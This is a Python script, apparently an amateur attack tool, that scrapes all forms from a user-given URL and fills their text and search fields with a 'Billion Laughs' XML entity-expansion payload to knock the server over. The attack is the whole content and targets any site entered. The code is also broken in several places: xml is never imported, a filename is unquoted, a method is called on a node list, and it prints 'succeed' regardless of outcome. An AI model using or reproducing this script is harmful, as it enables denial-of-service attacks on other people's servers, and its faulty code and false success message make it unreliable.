import requests
from bs4 import BeautifulSoup as beautifulSoup
from xml.dom import minidom
from urllib.parse import urljoin

def get_all_forms_from_page(url):
    # BeautifulSoup is a Python library for pulling data out of HTML and XML files, it works with a parser.
    # the BeautifulSoup object allows us to represent the document as a nested data structure
    # then, we can easily navigate the data structure to retrieve the information we're looking for (forms)
    soup = beautifulSoup(requests.get(url).content, "html.parser")
    return soup.find_all("form")

def get_form_details(form):
    # Once we have all the forms of the page, we need to extract the information that we need such as the
    # the action of the form, the method or other attributes

    inputs = []
    # in the next variable, we will gather all of the details of the HTML tags regarding the existing form
    form_details = {}

    action = form.attrs.get("action").lower()
    method = form.attrs.get("method", "get").lower()

    for one_input_tag in form.find_all("input"):
        type = one_input_tag.attrs.get("type", "text")
        name = one_input_tag.attrs.get("name")
        inputs.append({"type": type, "name": name})

    form_details["action"] = action
    form_details["method"] = method
    form_details["inputs"] = inputs
    return form_details

def submit_xmlbomb(url, form_details):
    input_tags = form_details["inputs"]
    form_action = form_details["action"]
    form_method = form_details["method"]

    url_params = {}  # data from the XML file that will be sent in the request

    bomb = xml.dom.minidom.parse(BillionLaughsAttack.xml)

    elements = bomb.getElementsByTagName("bomb")

    for one_input in input_tags:
        one_input_type = one_input["type"]
        if one_input_type == "text" or one_input_type == "search":
            one_input["value"] = elements.getAttribute("&j")

    one_input_name = one_input.get("name")
    one_input_value = one_input.get("value")
    if one_input_name and one_input_value:
        url_params[one_input_name] = one_input_value

    complete_url = urljoin(url, form_action)
    if form_method == "post":
        return requests.post(complete_url, url_params)
    elif form_method == "get":
        return requests.get(complete_url, url_params)
    else:  # only 3 methods are possible for the action of a form : post get or dialog
        return "The request type DIALOG is not supported"

def lunch_attack(url):
    all_forms = get_all_forms_from_page(url)

    for one_form in all_forms:
        form_details = get_form_details(one_form)
        for bomb in form_details:
            bomb = submit_xmlbomb(url, form_details)
            if isinstance(bomb, str):
                return "The form is not supported"
            else:
                requests.get(bomb, timeout=20)
                return "The Billion Laughs Attack succeed"
    return "Attack lunched"

if __name__ == "__main__":
    url = input()
    print(lunch_attack(url))

